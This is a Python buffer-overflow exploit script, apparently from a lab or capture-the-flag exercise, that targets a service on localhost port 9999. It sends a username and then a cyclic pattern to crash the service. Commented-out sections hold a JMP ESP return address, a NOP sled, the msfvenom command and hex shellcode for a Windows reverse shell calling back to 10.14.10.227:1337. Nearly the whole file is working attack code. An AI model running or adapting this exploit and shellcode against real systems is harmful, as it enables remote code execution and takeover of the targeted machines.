#!/usr/bin/env python3

import sys,socket

host = "127.0.0.1"
port = 9999

#offset = 2012
offset = 0
overflow = "a"*offset
retn = ""
padding = ""
#retn = "\xdf\x14\x50\x62"	# jmp esp 625014DF   FFE4             JMP ESP
#padding = "\x90"*16
"""
# msfvenom -p windows/shell_reverse_tcp LHOST=10.14.10.227 LPORT=1337 EXITFUNC=thread -b "\x00" -v payload -f py
payload = ""
payload += "\xd9\xcc\xb8\x6f\xd2\x36\x4c\xd9\x74\x24\xf4\x5b"
payload += "\x33\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\xac"
payload += "\xd6\xd4\xb9\xce\x3f\x9a\x42\x2e\xc0\xfb\xcb\xcb"
payload += "\xf1\x3b\xaf\x98\xa2\x8b\xbb\xcc\x4e\x67\xe9\xe4"
payload += "\xc5\x05\x26\x0b\x6d\xa3\x10\x22\x6e\x98\x61\x25"
payload += "\xec\xe3\xb5\x85\xcd\x2b\xc8\xc4\x0a\x51\x21\x94"
payload += "\xc3\x1d\x94\x08\x67\x6b\x25\xa3\x3b\x7d\x2d\x50"
payload += "\x8b\x7c\x1c\xc7\x87\x26\xbe\xe6\x44\x53\xf7\xf0"
payload += "\x89\x5e\x41\x8b\x7a\x14\x50\x5d\xb3\xd5\xff\xa0"
payload += "\x7b\x24\x01\xe5\xbc\xd7\x74\x1f\xbf\x6a\x8f\xe4"
payload += "\xbd\xb0\x1a\xfe\x66\x32\xbc\xda\x97\x97\x5b\xa9"
payload += "\x94\x5c\x2f\xf5\xb8\x63\xfc\x8e\xc5\xe8\x03\x40"
payload += "\x4c\xaa\x27\x44\x14\x68\x49\xdd\xf0\xdf\x76\x3d"
payload += "\x5b\xbf\xd2\x36\x76\xd4\x6e\x15\x1f\x19\x43\xa5"
payload += "\xdf\x35\xd4\xd6\xed\x9a\x4e\x70\x5e\x52\x49\x87"
payload += "\xa1\x49\x2d\x17\x5c\x72\x4e\x3e\x9b\x26\x1e\x28"
payload += "\x0a\x47\xf5\xa8\xb3\x92\x5a\xf8\x1b\x4d\x1b\xa8"
payload += "\xdb\x3d\xf3\xa2\xd3\x62\xe3\xcd\x39\x0b\x8e\x34"
payload += "\xaa\x3e\x41\x3c\xc9\x57\x5f\x40\x08\x91\xd6\xa6"
payload += "\x78\xf1\xbe\x71\x15\x68\x9b\x09\x84\x75\x31\x74"
payload += "\x86\xfe\xb6\x89\x49\xf7\xb3\x99\x3e\xf7\x89\xc3"
payload += "\xe9\x08\x24\x6b\x75\x9a\xa3\x6b\xf0\x87\x7b\x3c"
payload += "\x55\x79\x72\xa8\x4b\x20\x2c\xce\x91\xb4\x17\x4a"
payload += "\x4e\x05\x99\x53\x03\x31\xbd\x43\xdd\xba\xf9\x37"
payload += "\xb1\xec\x57\xe1\x77\x47\x16\x5b\x2e\x34\xf0\x0b"
payload += "\xb7\x76\xc3\x4d\xb8\x52\xb5\xb1\x09\x0b\x80\xce"
payload += "\xa6\xdb\x04\xb7\xda\x7b\xea\x62\x5f\x9b\x09\xa6"
payload += "\xaa\x34\x94\x23\x17\x59\x27\x9e\x54\x64\xa4\x2a"
payload += "\x25\x93\xb4\x5f\x20\xdf\x72\x8c\x58\x70\x17\xb2"
payload += "\xcf\x71\x32"
"""

payload = ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaaumaaunaauoaaupaauqaauraausaautaauuaauvaauwaauxaauyaauzaavbaavcaavdaaveaavfaavgaavhaaviaavjaavkaavlaavmaavnaavoaavpaavqaavraavsaavtaavuaavvaavwaavxaavyaavzaawbaawcaawdaaweaawfaawgaawhaawiaawjaawkaawlaawmaawnaawoaawpaawqaawraawsaawtaawuaawvaawwaawxaawyaawzaaxbaaxcaaxdaaxeaaxfaaxgaaxhaaxiaaxjaaxkaaxlaaxmaaxnaaxoaaxpaaxqaaxraaxsaaxtaaxuaaxvaaxwaaxxaaxyaaxzaaybaaycaaydaayeaayfaaygaayhaayiaayjaaykaaylaaymaaynaayoaaypaayqaayraaysaaytaayuaayvaaywaayxaayyaay")

s_buffer = overflow + retn + padding + payload

s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024) # welcome
s.recv(1024) # username prompt
s.send(bytes("vuln", 'latin-1'))
s.recv(1024) # message prompt
s.send(bytes(s_buffer, 'latin-1'))
print("Application crashed :)")
